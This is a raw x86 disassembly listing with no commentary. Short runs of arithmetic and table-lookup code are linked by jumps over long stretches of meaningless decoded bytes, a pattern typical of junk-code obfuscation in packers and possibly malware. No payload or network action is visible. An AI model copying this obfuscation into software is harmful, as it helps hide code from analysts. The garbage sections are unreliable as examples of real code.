  402255:	inc    eax
  402256:	out    0xdd,al
  402258:	cmp    DWORD PTR [ecx],0xffffff9f
  40225b:	xchg   ch,ch
  40225d:	inc    esi
  40225e:	cmp    DWORD PTR [ebx-0x13c44a],0xed0256b5
  402268:	or     al,0x3f
  40226a:	ror    DWORD PTR ds:[ecx-0x45],0xf4
  40226f:	nop
  402270:	push   ecx
  402271:	mov    ebx,0xb6e16cca
  402276:	mov    eax,ebx
  402278:	jmp    0x2705:0x250d
  40227e:	mov    edx,0x33d16e29
  402283:	outs   dx,BYTE PTR ds:[esi]
  402284:	std    
  402285:	inc    esi
  402286:	sbb    BYTE PTR [ecx+ebp*1],al
  402289:	repnz popf 
  40228b:	(bad)  [edi+eiz*2+0xec4ff6f]
  402292:	rol    DWORD PTR [esi],0x2a
  402295:	jle    0x402223
  402297:	mov    ebx,0xd798bfea
  40229c:	xor    al,0x1e
  40229e:	xchg   ebp,eax
  40229f:	lods   al,BYTE PTR ds:[esi]
  4022a0:	aas    
  4022a1:	lds    ecx,FWORD PTR [ebx]
  4022a3:	or     DWORD PTR [ebx+0x44fa2872],edx
  4022a9:	dec    ebp
  4022aa:	cmc    
  4022ab:	adc    DWORD PTR [esi+0x1edd0ab3],eax
  4022b1:	xchg   edx,eax
  4022b2:	add    al,0x60
  4022b4:	xchg   ecx,eax
  4022b5:	inc    DWORD PTR [eax]
  4022b7:	push   ecx
  4022b8:	gs inc ecx
  4022ba:	cdq    
  4022bb:	arpl   WORD PTR [ecx+0x30],sp
  4022be:	retf   
  4022bf:	aam    0x98
  4022c1:	ret    0xc53c
  4022c4:	fisttp DWORD PTR [edx-0x745cdec6]
  4022ca:	dec    edi
  4022cb:	cmp    DWORD PTR [eax-0x82810a7],ebx
  4022d1:	call   edx
  4022d3:	(bad)  
  4022d4:	mov    dl,0x7b
  4022d6:	push   ebx
  4022d7:	add    ecx,DWORD PTR [edx+0xc6bc200]
  4022dd:	ss scas al,BYTE PTR es:[edi]
  4022df:	xor    cl,BYTE PTR [eax]
  4022e1:	es pop eax
  4022e3:	pop    edx
  4022e4:	and    BYTE PTR ds:0x1ddfa5e6,dl
  4022ea:	push   cs
  4022eb:	sbb    eax,0x7e935083
  4022f0:	imul   esi,DWORD PTR [ecx+0x34df8d7],0x9b0996b7
  4022fa:	test   DWORD PTR [eax+0x78],edx
  4022fd:	test   al,0x23
  4022ff:	cmp    eax,0xd4217376
  402304:	pushf  
  402305:	fadd   QWORD PTR [eax+esi*1-0x2c]
  402309:	data16 lahf 
  40230b:	cmc    
  40230c:	out    dx,al
  40230d:	sbb    dl,cl
  40230f:	xlat   BYTE PTR ds:[ebx]
  402310:	push   edx
  402311:	pop    edx
  402312:	aaa    
  402313:	adc    DWORD PTR [esi-0x199abd31],esi
  402319:	rcl    BYTE PTR [ecx+ecx*1],0xbd
  40231d:	stos   BYTE PTR es:[edi],al
  40231e:	ins    BYTE PTR es:[edi],dx
  40231f:	mov    edi,0xe868e9d3
  402324:	(bad)  
  402325:	push   ds
  402326:	jp     0x402313
  402328:	scas   al,BYTE PTR es:[edi]
  402329:	xchg   esp,eax
  40232a:	ror    ebx,cl
  40232c:	cmp    al,0x55
  40232e:	shr    DWORD PTR [eax],0xf7
  402331:	inc    ebx
  402332:	fstp   QWORD PTR [eax+0x1c]
  402335:	out    0xc6,al
  402337:	xchg   esi,eax
  402338:	push   0xffffffbd
  40233a:	bound  edx,QWORD PTR [esi-0x7d]
  40233d:	or     ecx,DWORD PTR ds:0xfc7d8ba8
  402343:	xor    edx,eax
  402345:	not    ebx
  402347:	xor    edi,eax
  402349:	mov    ebx,DWORD PTR ds:0x4292bd
  40234f:	add    ebx,DWORD PTR ds:0x427cf7
  402355:	mov    DWORD PTR ds:0x4292bd,ebx
  40235b:	add    edi,ecx
  40235d:	movzx  ebx,WORD PTR ds:0x427598
  402364:	or     ebx,DWORD PTR ds:0x42c892
  40236a:	mov    DWORD PTR ds:0x427598,ebx
  402370:	add    edx,ecx
  402372:	imul   edx,edi
  402375:	mov    ebx,DWORD PTR ds:0x4292d5
  40237b:	sbb    DWORD PTR ds:0x427d0f,ebx
  402381:	mov    edi,DWORD PTR [ebp-0x8]
  402384:	mov    ebx,DWORD PTR [ebp-0x10]
  402387:	sbb    DWORD PTR ds:0x4292a1,0x3598
  402391:	sub    ebx,edi
  402393:	mov    DWORD PTR ds:0x427d13,0x71c6
  40239d:	cmp    ebx,edx
  40239f:	mov    DWORD PTR ds:0x42759c,0x6366
  4023a9:	ja     0x4023ce
  4023af:	movzx  edx,WORD PTR ds:0x4292d9
  4023b6:	xor    edx,DWORD PTR ds:0x4292a9
  4023bc:	mov    DWORD PTR ds:0x4292d9,edx
  4023c2:	mov    edx,DWORD PTR [ebp-0x4]
  4023c5:	xor    edx,eax
  4023c7:	add    edx,ecx
  4023c9:	jmp    0x402807
  4023ce:	mov    edx,DWORD PTR [ebp-0x2c]
  4023d1:	mov    edi,DWORD PTR [ebp-0x4]
  4023d4:	xor    edx,eax
  4023d6:	xor    edi,eax
  4023d8:	add    edi,ecx
  4023da:	add    edx,ecx
  4023dc:	imul   edx,edi
  4023df:	mov    edi,DWORD PTR [ebp-0x8]
  4023e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4023e5:	sub    ebx,edi
  4023e7:	cmp    ebx,edx
  4023e9:	ja     0x4023f7
  4023ef:	mov    edx,DWORD PTR [ebp-0x28]
  4023f2:	jmp    0x4027f9
  4023f7:	mov    edx,DWORD PTR [ebp-0x30]
  4023fa:	mov    edi,DWORD PTR [ebp-0x4]
  4023fd:	xor    edx,eax
  4023ff:	xor    edi,eax
  402401:	add    edi,ecx
  402403:	add    edx,ecx
  402405:	imul   edx,edi
  402408:	mov    edi,DWORD PTR [ebp-0x8]
  40240b:	mov    ebx,DWORD PTR [ebp-0x10]
  40240e:	sub    ebx,edi
  402410:	cmp    ebx,edx
  402412:	ja     0x402420
  402418:	mov    edx,DWORD PTR [ebp-0x2c]
  40241b:	jmp    0x4027f9
  402420:	mov    edx,DWORD PTR [ebp-0x34]
  402423:	mov    edi,DWORD PTR [ebp-0x4]
  402426:	xor    edx,eax
  402428:	xor    edi,eax
  40242a:	add    edi,ecx
  40242c:	add    edx,ecx
  40242e:	imul   edx,edi
  402431:	mov    edi,DWORD PTR [ebp-0x8]
  402434:	jmp    0x402554
  402439:	ret    
  40243a:	fwait
  40243b:	dec    ebp
  40243c:	int    0x4d
  40243e:	fld    QWORD PTR [ebx-0x63]
  402441:	out    0xff,al
  402443:	loop   0x4024a4
  402445:	jecxz  0x4024c0
  402447:	mov    eax,0x7c768db9
  40244c:	jl     0x4024bf
  40244e:	jg     0x4024cc
  402450:	jl     0x40248a
  402452:	mov    dl,0x66
  402454:	xchg   BYTE PTR [ecx-0x10],dh
  402457:	sub    ebp,ebp
  402459:	das    
  40245a:	gs mov al,0xe3
  40245d:	out    dx,al
  40245e:	sbb    ch,bl
  402460:	pop    bx
  402462:	sub    eax,0x74a138bf
  402467:	retf   
  402468:	lods   eax,DWORD PTR ds:[esi]
  402469:	mov    eax,0x39fcc6dd
  40246e:	es cwde 
  402470:	sbb    esp,DWORD PTR [ecx+0x2413e03]
  402476:	jo     0x4024f6
  402478:	add    cl,BYTE PTR [edi]
  40247a:	mov    ?,WORD PTR [edi]
  40247c:	pop    ds
  40247d:	call   0xfaca853b
  402482:	repz add DWORD PTR ds:0x30739855,ebx
  402489:	sub    edi,ecx
  40248b:	push   esi
  40248c:	push   ebp
  40248d:	jo     0x40249c
  40248f:	rcr    BYTE PTR [eax-0x1c],cl
  402492:	scas   eax,DWORD PTR es:[edi]
  402493:	and    BYTE PTR [eax+0x1bef9b8b],al
  402499:	mov    BYTE PTR [ecx+0x3a],bh
  40249c:	xchg   BYTE PTR [edx+eax*2+0x56],ah
  4024a0:	sbb    dh,BYTE PTR [eax-0x50]
  4024a3:	ins    BYTE PTR es:[edi],dx
  4024a4:	xor    BYTE PTR [eax-0x63caf6d2],bl
  4024aa:	mov    bl,0x59
  4024ac:	or     ch,BYTE PTR [esi+0x6a30300]
  4024b2:	add    ah,BYTE PTR [edx+0x16]
  4024b5:	pop    ebx
  4024b6:	pop    eax
  4024b7:	cld    
  4024b8:	aaa    
  4024b9:	jge    0x40250f
  4024bb:	push   ebp
  4024bc:	xor    al,BYTE PTR [edi-0x4b5e56c0]
  4024c2:	mov    edx,0xa43c84e7
  4024c7:	mov    edi,0x68ba0513
  4024cc:	inc    edi
  4024cd:	add    ebp,DWORD PTR [edi-0x7f381022]
  4024d3:	lds    edx,FWORD PTR [ebx]
  4024d5:	sbb    eax,0x1785fa7a
  4024db:	inc    ebp
  4024dc:	jle    0x402537
  4024de:	pop    ss
  4024df:	adc    eax,0x144b46fe
  4024e4:	in     al,dx
  4024e5:	pop    edi
  4024e6:	or     DWORD PTR [eax+0x22],0xffffff96
  4024ea:	cmp    DWORD PTR [ebx],eax
  4024ec:	ror    DWORD PTR [edx-0x27],cl
  4024ef:	ins    DWORD PTR es:[edi],dx
  4024f0:	mov    al,0xcd
  4024f2:	jb     0x40251a
  4024f4:	sub    al,0x76
  4024f6:	clc    
  4024f7:	aas    
  4024f8:	sub    ah,dh
  4024fa:	cmp    eax,0xb58b89fb
  4024ff:	loopne 0x4024ea
  402501:	(bad)
  402504:	adc    ecx,DWORD PTR [ecx+0x4c]
  402507:	in     eax,dx
  402508:	and    eax,0x63e55bff
  40250d:	scas   al,BYTE PTR es:[edi]
  40250e:	sbb    DWORD PTR [edi-0x500a1a4b],edx
  402514:	adc    ebx,eax
  402516:	pop    es
  402517:	mov    dl,0x52
  402519:	jmp    0x4024eb
  40251b:	jnp    0x402554
  40251d:	pop    edx
  40251e:	sub    al,0xf2
  402520:	adc    dh,ch
  402522:	pusha  
  402523:	(bad)  
  402524:	mov    dh,0xb4
  402526:	stc    
  402527:	jmp    0x38bf:0x75350550
  40252e:	or     eax,0x9a46e3cb
  402533:	repnz add eax,0xd9776d30
  402539:	mov    esp,0x21dff3e8
  40253e:	gs data16 jecxz 0x40255a
  402542:	push   edi
  402543:	dec    esp
  402544:	je     0x40252e
  402546:	stc    
  402547:	push   edi
  402548:	lods   al,BYTE PTR ds:[esi]
  402549:	pop    ds
  40254a:	aas    
  40254b:	nop
  40254c:	or     ebx,eax
  40254e:	(bad)  
  40254f:	fst    QWORD PTR [ebp-0x75]
  402552:	cmc    
  402553:	loope  0x4024e0
  402555:	pop    ebp
  402556:	lock sub ebx,edi
  402559:	cmp    ebx,edx
  40255b:	ja     0x402569
  402561:	mov    edx,DWORD PTR [ebp-0x30]
  402564:	jmp    0x4027f9
  402569:	mov    edx,DWORD PTR [ebp-0x38]
  40256c:	mov    edi,DWORD PTR [ebp-0x4]
  40256f:	xor    edx,eax
  402571:	xor    edi,eax
  402573:	add    edi,ecx
  402575:	add    edx,ecx
  402577:	imul   edx,edi
  40257a:	mov    edi,DWORD PTR [ebp-0x8]
  40257d:	mov    ebx,DWORD PTR [ebp-0x10]
  402580:	sub    ebx,edi
  402582:	cmp    ebx,edx
  402584:	ja     0x402592
  40258a:	mov    edx,DWORD PTR [ebp-0x34]
  40258d:	jmp    0x4027f9
  402592:	mov    edx,DWORD PTR [ebp-0x3c]
  402595:	mov    edi,DWORD PTR [ebp-0x4]
  402598:	xor    edx,eax
  40259a:	xor    edi,eax
  40259c:	add    edx,ecx
  40259e:	add    edi,ecx
  4025a0:	jmp    0x4026c0
  4025a5:	push   ds
  4025a6:	in     al,0x25
  4025a8:	pop    es
  4025a9:	std    
  4025aa:	(bad)  [edx]
  4025ac:	stc    
  4025ad:	dec    edx
  4025ae:	mov    WORD PTR [ebp-0x45],?
  4025b1:	enter  0x7e2,0xc3
  4025b5:	mov    cs,WORD PTR [ecx]
  4025b7:	jl     0x402635
  4025b9:	jno    0x40263a
  4025bb:	jl     0x402639
  4025bd:	add    ebx,DWORD PTR [ebx]
  4025bf:	sbb    bl,BYTE PTR [esi+ebp*8]
  4025c2:	(bad)  
  4025c4:	mov    BYTE PTR [edx-0x48f5f476],ah
  4025ca:	xor    eax,0xd515aed
  4025cf:	or     eax,edi
  4025d1:	outs   dx,DWORD PTR ds:[esi]
  4025d2:	and    edi,DWORD PTR [ecx]
  4025d4:	dec    esp
  4025d5:	xor    BYTE PTR [edi+0x3b],bl
  4025d8:	jbe    0xa5deca47
  4025de:	jbe    0x402659
  4025e0:	cmp    DWORD PTR [ebx+0x1a],0x2d
  4025e4:	sub    al,0xbc
  4025e6:	sub    edi,DWORD PTR [ebx-0x73]
  4025e9:	add    ebx,DWORD PTR [ecx+0x46]
  4025ec:	jp     0x402608
  4025ee:	mov    BYTE PTR [eax+0x25],al
  4025f1:	inc    eax
  4025f2:	call   0xa20:0xd5911475
  4025f9:	ret    
  4025fa:	jns    0x402597
  4025fc:	rol    BYTE PTR [eax+0x9c45a3d],0xa5
  402603:	dec    ebx
  402604:	mov    esi,0x5f16c63e
  402609:	mov    bl,0x66
  40260b:	popa   
  40260c:	fmul   QWORD PTR [eax-0x7867552c]
  402612:	ins    DWORD PTR es:[edi],dx
  402613:	shl    BYTE PTR [ecx],1
  402615:	rcr    BYTE PTR [edx+0x75],cl
  402618:	push   eax
  402619:	or     eax,0xb24100a7
  40261e:	rcr    dh,0x6a
  402621:	stc    
  402622:	xchg   esi,eax
  402623:	adc    DWORD PTR [ecx-0x3e],esi
  402626:	scas   al,BYTE PTR es:[edi]
  402627:	pop    ss
  402628:	lahf   
  402629:	stos   DWORD PTR es:[edi],eax
  40262a:	dec    esp
  40262b:	out    dx,eax
  40262c:	xchg   cl,cl
  40262e:	outs   dx,BYTE PTR ds:[esi]
  40262f:	enter  0x5e21,0xf5
  402633:	mov    ah,0x61
  402635:	neg    ecx
  402637:	scas   eax,DWORD PTR es:[edi]
  402638:	mov    eax,ds:0x985aac8a
  40263d:	lea    ebp,[ecx+0x7e]
  402640:	inc    ebx
  402641:	stos   BYTE PTR es:[edi],al
  402642:	ss pop ebx
  402644:	mov    ds:0xfdb6e2d5,al
  402649:	ja     0x402612
  40264b:	add    eax,0x8896df7f
  402650:	out    dx,al
  402651:	sbb    DWORD PTR [edx],ebp
  402653:	cdq    
  402654:	nop
  402655:	aas    
  402656:	adc    ch,BYTE PTR [ecx-0x44]
  402659:	sti    
  40265a:	retf   
  40265b:	repnz lock shl bl,cl
  40265f:	cld    
  402660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402661:	jnp    0x402610
  402663:	push   ecx
  402664:	jb     0x4026d6
  402666:	lods   al,BYTE PTR ds:[esi]
  402667:	and    DWORD PTR [esi-0x29],0x901b8c33
  40266e:	sub    al,0xb7
  402670:	std    
  402671:	rcl    ah,0x70
  402674:	or     cl,BYTE PTR [edi-0xb]
  402677:	das    
  402678:	in     al,0x74
  40267a:	push   0x9c73b690
  40267f:	push   ss
  402680:	mov    edi,0xc723b64a
  402685:	mov    al,0x7e
  402687:	pop    esp
  402688:	push   esi
  402689:	cmp    DWORD PTR [ecx],eax
  40268b:	jmp    0x62493969
  402690:	lahf   
  402691:	in     eax,0x41
  402693:	bound  esi,QWORD PTR ds:0x1adcc721
  402699:	or     BYTE PTR fs:[esi-0x7b],ah
  40269d:	mov    cl,0x39
  40269f:	lock ss stos DWORD PTR es:[edi],eax
  4026a2:	fs aam 0x67
  4026a5:	stos   DWORD PTR es:[edi],eax
  4026a6:	mov    ebp,0xc9459022
  4026ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026ac:	gs inc esp
  4026ae:	in     eax,0x60
  4026b0:	cli    
  4026b1:	jmp    0x17bea11d
  4026b6:	mov    ebx,DWORD PTR [eax+0x3206b02c]
  4026bc:	pop    ds
  4026bd:	rcl    BYTE PTR [esi],0x8f
  4026c0:	imul   edx,edi
  4026c3:	mov    edi,DWORD PTR [ebp-0x8]
  4026c6:	jmp    0x4027e6
  4026cb:	test   eax,0x4dcf8b5f
  4026d0:	sti    
  4026d1:	jge    0x40274c
  4026d3:	test   BYTE PTR [ebx],0x46
  4026d6:	adc    eax,0x45edd4e9
  4026db:	or     DWORD PTR [eax],0x7c
  4026de:	jl     0x402751
  4026e0:	jg     0x40275e
  4026e2:	jl     0x4026a0
  4026e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026e5:	test   al,0x8c
  4026e7:	pop    es
  4026e8:	je     0x4026af
  4026ea:	jmp    0x402727
  4026ec:	jl     0x40275f
  4026ee:	jnp    0x402687
  4026f0:	pop    ecx
  4026f1:	xchg   ecx,eax
  4026f2:	test   al,0x77
  4026f4:	jp     0x4026f9
  4026f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026f7:	sbb    BYTE PTR [esi-0xb27439f],dl
  4026fd:	mov    edi,0x70921dd1
  402702:	in     al,dx
  402703:	inc    esp
  402704:	adc    ebp,DWORD PTR [ebp-0x24]
  402707:	push   ss
  402708:	bound  eax,QWORD PTR [eax]
  40270a:	or     BYTE PTR [edi+0x0],ah
  40270d:	(bad)  
  40270e:	dec    ecx
  40270f:	xor    DWORD PTR [ecx-0x1f],0x7a
  402713:	inc    ebp
  402714:	sub    DWORD PTR [edx+0x5187636e],edi
  40271a:	adc    bl,BYTE PTR [ebx+0xd]
  40271d:	loope  0x4026f6
  40271f:	dec    ecx
  402720:	xchg   esi,eax
  402721:	adc    BYTE PTR [eax+0x4f],dh
  402724:	scas   eax,DWORD PTR es:[edi]
  402725:	leave  
  402726:	dec    ebp
  402727:	das    
  402728:	test   DWORD PTR [eax+edi*8-0x58],edx
  40272c:	aad    0x50
  40272e:	call   0xd78c:0x99a55332
  402735:	mov    esp,0xa0f7ea9
  40273a:	fmul   st,st(7)
  40273c:	inc    edx
  40273d:	call   0xd9e2a13a
  402742:	push   edi
  402743:	add    al,0xa1
  402745:	std    
  402746:	jns    0x4026f4
  402748:	sbb    BYTE PTR [ebx-0x6a],ch
  40274b:	add    DWORD PTR [esi+0x79c7ea2d],edi
  402751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402752:	ins    BYTE PTR es:[edi],dx
  402753:	xchg   ebp,eax
  402754:	imul   edx,DWORD PTR [esi],0x14
  402757:	pushf  
  402758:	jp     0x402772
  40275a:	mov    bh,0xe2
  40275c:	test   bl,0xa6
  40275f:	adc    ebp,DWORD PTR [ecx]
  402761:	adc    eax,0x61d616d8
  402766:	mov    eax,0x33b43211
  40276b:	mov    ds:0xc4779e6b,eax
  402770:	push   ebp
  402771:	jle    0x402729
  402773:	stos   BYTE PTR es:[edi],al
  402774:	inc    edx
  402775:	sahf   
  402776:	mov    bh,0xd8
  402778:	xchg   esi,eax
  402779:	mov    ecx,0xcc81627a
  40277e:	popf   
  40277f:	lock nop DWORD PTR ds:0xeed41515
  402787:	jmp    0xb460:0xa93b9d2b
  40278e:	fcmovnbe st,st(6)
  402790:	mov    ebp,0x7338d7be
  402795:	mov    WORD PTR [eax+0x8],cs
  402798:	test   eax,0xab272018
  40279d:	lods   eax,DWORD PTR ds:[esi]
  40279e:	push   esp
  40279f:	sbb    esi,edi
  4027a1:	pop    ds
  4027a2:	mov    edx,0x8b9c6f07
  4027a7:	lds    edi,FWORD PTR [edi]
  4027a9:	sbb    bh,al
  4027ab:	xor    eax,DWORD PTR [ebp+0x2ebdf0f4]
  4027b1:	enter  0x1717,0xc3
  4027b5:	leave  
  4027b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027b7:	ins    BYTE PTR es:[edi],dx
  4027b8:	hlt    
  4027b9:	xchg   edx,eax
  4027ba:	cld    
  4027bb:	ins    DWORD PTR es:[edi],dx
  4027bc:	mov    eax,0x83cf82f0
  4027c1:	and    al,0x49
  4027c3:	and    DWORD PTR [ebx+0x5],eax
  4027c6:	inc    esp
  4027c7:	out    0x2e,eax
  4027c9:	retf   0x9fc0
  4027cc:	retf   
  4027cd:	add    al,0xa5
  4027cf:	cmp    eax,0x68c93e76
  4027d4:	add    edi,edi
  4027d6:	imul   edi,DWORD PTR ds:0xf9977882,0xffffffaf
  4027dd:	pop    esp
  4027de:	add    al,0xa2
  4027e0:	pop    ecx
  4027e1:	add    dh,BYTE PTR [edi+eiz*4+0x5d8b115e]
  4027e8:	lock sub ebx,edi
  4027eb:	cmp    ebx,edx
  4027ed:	mov    edx,DWORD PTR [ebp-0x38]
  4027f0:	jbe    0x4027f9
  4027f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4027f9:	mov    edi,DWORD PTR [ebp-0x4]
  4027fc:	xor    edi,eax
  4027fe:	xor    edx,eax
  402800:	add    edi,ecx
  402802:	add    edx,ecx
  402804:	imul   edx,edi
  402807:	mov    DWORD PTR [ebp+0xc],edx
  40280a:	mov    edx,DWORD PTR [ebp+0xc]
  40280d:	mov    DWORD PTR [ebp-0x24],edx
  402810:	mov    edx,DWORD PTR [ebp-0x8]
  402813:	add    edx,DWORD PTR [ebp-0x40]
  402816:	jmp    0x402936
  40281b:	push   esp
  40281c:	in     al,dx
  40281d:	dec    ebx
  40281e:	dec    ebp
  40281f:	pop    ebx
  402820:	jge    0x402878
  402822:	in     eax,0xc9
  402824:	std    
  402825:	ja     0x402846
  402827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402828:	bound  ecx,QWORD PTR [edx]
  40282a:	ret    0xb84
  40282d:	jl     0x4028ab
  40282f:	jno    0x4028b0
  402831:	jl     0x4028af
  402833:	mov    esi,fs
  402835:	outs   dx,BYTE PTR ds:[esi]
  402836:	ss clc 
  402838:	mov    edi,0xcea5c46b
  40283d:	hlt    
  40283e:	jl     0x402829
  402840:	stos   DWORD PTR es:[edi],eax
  402841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402842:	mov    ah,0x91
  402844:	jno    0x402878
  402846:	imul   ebx,edi,0xfffffffb
  402849:	test   BYTE PTR [ebx+0x43],dh
  40284c:	pop    edx
  40284d:	pop    eax
  40284e:	push   0x58
  402850:	mov    ebx,DWORD PTR [edi]
  402852:	rcl    DWORD PTR [ebp+0x649c0bb9],0xb9
  402859:	(bad)  [edx]
  40285b:	into   
  40285c:	sbb    DWORD PTR [esi+0x66],ebp
  40285f:	jmp    0x78da7b36
  402864:	out    0x6,al
  402866:	pop    edi
  402867:	or     ebp,eax
  402869:	mov    ah,0x53
  40286b:	retf   
  40286c:	mov    esp,0x3371ce05
  402871:	addr16 adc cl,dl
  402874:	inc    BYTE PTR [edi+ebx*4]
  402877:	push   edx
  402878:	imul   esi,DWORD PTR [edx-0x3b],0x71485860
  40287f:	xchg   edi,eax
  402880:	adc    bl,BYTE PTR [edx]
  402882:	iret   
  402883:	push   ebx
  402884:	loop   0x40285e
  402886:	clc    
  402887:	jb     0x402897
  402889:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40288a:	leave  
  40288b:	ins    BYTE PTR es:[edi],dx
  40288c:	xor    BYTE PTR [esi+0x6a],bh
  40288f:	enter  0x7715,0x6f
  402893:	dec    edx
  402894:	jg     0x4028ca
  402896:	sub    bl,dh
  402898:	ficom  DWORD PTR [ecx]
  40289a:	stos   DWORD PTR es:[edi],eax
  40289b:	mul    esp
  40289d:	loopne 0x4028f8
  40289f:	mov    DWORD PTR [edi-0x3f],ebp
  4028a2:	es imul ch
  4028a5:	mov    ebp,0x7330a637
  4028aa:	push   ds
  4028ab:	xchg   ecx,eax
  4028ac:	mov    edx,0xb92d30a0
  4028b1:	out    0x6d,al
  4028b3:	test   eax,0xa8d0185a
  4028b8:	cdq    
  4028b9:	ret    
  4028ba:	mov    edi,0x1323076
  4028bf:	mov    ah,0x1f
  4028c1:	lds    esp,FWORD PTR [ebx-0x24]
  4028c4:	mov    bl,0x40
  4028c6:	mov    ebp,0x7eb4c653
  4028cb:	fcomp  QWORD PTR [eax-0x6c69c7fc]
  4028d1:	mov    edi,0x4dfd9397
  4028d6:	push   ss
  4028d7:	mov    dh,0x44
  4028d9:	int3   
  4028da:	mov    BYTE PTR [ebx+edx*4-0x524ea5ad],dh
  4028e1:	rol    DWORD PTR [eax+0x6b474c1b],cl
  4028e7:	sahf   
  4028e8:	addr16 lock test al,0x7f
  4028ec:	fiadd  DWORD PTR [edi+edi*2-0x198e6978]
  4028f3:	pop    ebx
  4028f4:	popa   
  4028f5:	or     BYTE PTR [eax],dh
  4028f7:	sub    ebx,ebp
  4028f9:	repnz push esi
  4028fb:	out    0xc5,eax
  4028fd:	xor    DWORD PTR [ebx+0x61],0x2f
  402901:	or     DWORD PTR [ebx+0x55],esp
  402904:	sbb    ecx,esi
  402906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402907:	mul    DWORD PTR [edi+0x1a]
  40290a:	cli    
  40290b:	je     0x402955
  40290d:	cdq    
  40290e:	and    BYTE PTR [ecx],dl
  402910:	clc    
  402911:	sub    esi,esp
  402913:	mov    cl,0x1a
  402915:	sub    bh,ah
  402917:	xor    BYTE PTR [ebp-0x71e5c360],0xd7
  40291e:	loope  0x402947
  402920:	mul    eax
  402922:	mov    ds:0x1ebf3e88,al
  402927:	sub    al,0xd3
  402929:	aaa    
  40292a:	adc    BYTE PTR [esi+0x24f9f468],ah
  402930:	push   es
  402931:	cld    
  402932:	dec    bp
  402934:	(bad)  
  402935:	lock mov DWORD PTR [ebp-0x18],0xf89c8535
  40293d:	mov    DWORD PTR [ebp-0x1c],edx
  402940:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  402947:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40294e:	mov    edx,DWORD PTR [ebp-0x18]
  402951:	xor    edx,eax
  402953:	add    edx,ecx
  402955:	jmp    0x402ae2
  40295a:	mov    edx,DWORD PTR [ebp-0x18]
  40295d:	xor    edx,eax
  40295f:	add    edx,DWORD PTR [ebp-0x14]
  402962:	mov    edi,DWORD PTR [ebp-0x1c]
  402965:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  40296c:	mov    BYTE PTR [ebp+0xf],dl
  40296f:	mov    edx,DWORD PTR [ebp-0xc]
  402972:	xor    edx,eax
  402974:	add    edx,DWORD PTR [ebp-0x14]
  402977:	mov    edi,DWORD PTR [ebp-0x1c]
  40297a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  402981:	mov    BYTE PTR [ebp+0xb],dl
  402984:	mov    dl,BYTE PTR [ebp+0xf]
  402987:	mov    edi,DWORD PTR [ebp-0xc]
  40298a:	jmp    0x402aaa
  40298f:	inc    eax
  402990:	(bad)
  402993:	imul   edi,DWORD PTR [edx+0x43],0x97beacfd
  40299a:	jno    0x40296c
  40299c:	push   esi
  40299d:	mov    ebx,0x7c0a9910
  4029a2:	jl     0x402a15
  4029a4:	jg     0x402a22
  4029a6:	jl     0x402946
  4029a8:	xchg   edx,eax
  4029a9:	push   esp
  4029aa:	loope  0x40298d
  4029ac:	push   edx
  4029ad:	mov    cl,bh
  4029af:	loope  0x402a25
  4029b1:	mov    bh,BYTE PTR [esi+0x76]
  4029b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029b5:	in     eax,dx
  4029b6:	jo     0x402a29
  4029b8:	or     BYTE PTR [ecx],cl
  4029ba:	daa    
  4029bb:	jge    0x402993
  4029bd:	leave  
  4029be:	dec    edx
  4029bf:	mov    dl,0xe5
  4029c2:	int    0x19
  4029c4:	and    eax,0xb3ac0de9
  4029c9:	add    BYTE PTR [ecx],0x3
  4029cc:	jl     0x402957
  4029ce:	xor    eax,0xbc243cb3
  4029d3:	mov    cl,0x8b
  4029d5:	iret   
  4029d6:	sub    BYTE PTR [ebx+0x32],bl
  4029d9:	inc    eax
  4029da:	sbb    dl,cl
  4029dc:	icebp  
  4029dd:	pusha  
  4029de:	push   cs
  4029df:	inc    edx
  4029e0:	mov    bh,0x9c
  4029e2:	ds iret 
  4029e4:	or     ebp,DWORD PTR [esi]
  4029e6:	push   0x48bb26c
  4029eb:	pop    ss
  4029ec:	arpl   WORD PTR [ecx],bx
  4029ee:	add    eax,0x4d26759c
  4029f3:	mov    cl,0x49
  4029f5:	bound  esp,QWORD PTR [esi+0x7]
  4029f8:	pop    ecx
  4029f9:	test   eax,0x91197ed8
  4029fe:	test   DWORD PTR [esi+0x2c],eax
  402a01:	das    
  402a02:	test   al,0x1
  402a04:	push   es
  402a05:	rcl    BYTE PTR [edi],0xf3
  402a08:	pop    ds
  402a09:	stos   DWORD PTR es:[edi],eax
  402a0a:	sbb    dh,ch
  402a0c:	add    eax,0x35cf5c03
  402a11:	pop    ebp
  402a12:	adc    al,BYTE PTR [edx]
  402a14:	mov    DWORD PTR [esi+0x37841df2],0x85a322e0
  402a1e:	or     BYTE PTR [esi-0x65],0x1b
  402a22:	mov    ebx,0x7e78e6c1
  402a27:	jl     0x4029b5
  402a29:	out    dx,eax
  402a2a:	stc    
  402a2b:	pop    es
  402a2c:	cmp    BYTE PTR [ebp+0x41d69e55],dl
  402a32:	dec    ecx
  402a33:	dec    eax
  402a34:	mov    dh,BYTE PTR [ebx]
  402a36:	jmp    0x402a47
  402a38:	(bad)  
  402a39:	(bad)  
  402a3a:	sub    ebp,esp
  402a3c:	popa   
  402a3d:	fistp  WORD PTR [ecx]
  402a3f:	cmc    
  402a40:	xchg   ecx,eax
  402a41:	popa   
  402a42:	in     al,dx
  402a43:	mov    eax,ds:0xee79bb1c
  402a48:	out    0xac,al
  402a4a:	div    DWORD PTR [edx+0x32dc64a0]
  402a50:	mov    ah,cl
  402a52:	jnp    0x402a0d
  402a54:	mov    ch,ah
  402a56:	adc    DWORD PTR [edx+0x777838fc],esp
  402a5c:	hlt    
  402a5d:	repz ror BYTE PTR [esp+ebx*8-0x4d],0x23
  402a63:	mov    ah,0xf0
  402a65:	lahf   
